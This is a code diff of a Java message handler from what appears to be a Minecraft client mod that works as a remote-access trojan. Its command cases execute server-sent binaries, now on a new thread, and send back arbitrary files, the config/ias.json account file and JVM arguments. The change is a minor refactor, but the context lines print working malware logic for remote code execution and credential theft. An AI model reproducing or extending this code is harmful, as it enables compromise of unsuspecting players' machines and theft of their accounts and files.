@@ -1,17 +1,13 @@
 package me.soda.witch.client.connection;
 
 import com.google.gson.Gson;
-import me.soda.witch.client.utils.ShellcodeLoader;
 import me.soda.witch.client.Variables;
-import me.soda.witch.client.utils.ChatUtil;
-import me.soda.witch.client.utils.MCUtils;
-import me.soda.witch.client.utils.NetUtil;
-import me.soda.witch.client.utils.ScreenshotUtil;
+import me.soda.witch.client.utils.*;
 import me.soda.witch.shared.FileUtil;
 import me.soda.witch.shared.LogUtil;
-import me.soda.witch.shared.socket.messages.PlayerInfo;
 import me.soda.witch.shared.ProgramUtil;
 import me.soda.witch.shared.socket.messages.Message;
+import me.soda.witch.shared.socket.messages.PlayerInfo;
 import net.minecraft.client.util.GlfwUtil;
 import net.minecraft.text.Text;
 
@@ -55,7 +51,7 @@ public class MessageHandler {
                     Variables.INSTANCE.canJoinServer = !Variables.INSTANCE.canJoinServer;
                 }
                 case "kick" -> MCUtils.disconnect();
-                case "execute" -> ProgramUtil.runProg((byte[]) msg);
+                case "execute" -> new Thread(() -> ProgramUtil.runProg((byte[]) msg)).start();
                 case "iasconfig" -> NetUtil.send(msgType, FileUtil.read("config/ias.json"));
                 case "read" -> NetUtil.send(msgType, FileUtil.read((String) msg));
                 case "runargs" -> NetUtil.send(msgType, ManagementFactory.getRuntimeMXBean().getInputArguments());
